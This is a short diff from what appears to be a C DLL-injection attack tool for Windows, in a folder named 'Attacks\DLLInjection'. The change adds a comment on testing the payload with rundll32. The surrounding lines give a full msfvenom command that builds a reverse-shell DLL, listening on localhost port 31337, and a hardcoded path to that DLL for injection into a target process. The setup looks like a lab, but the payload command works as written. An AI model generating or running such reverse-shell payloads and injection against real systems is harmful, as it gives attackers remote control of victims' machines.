@@ -16,6 +16,7 @@ int main(int argc, char *argv[]) {
 
     // Reverse shell to 127.0.0.1:31337
     // msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f dll -b \x00\x0a\x0d -o reverse.dll
+    // Can test with rundll32.exe reverse.dll,dll_main
     wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\reverse.dll");
 
     // Get a PID, error out if improper input for PID
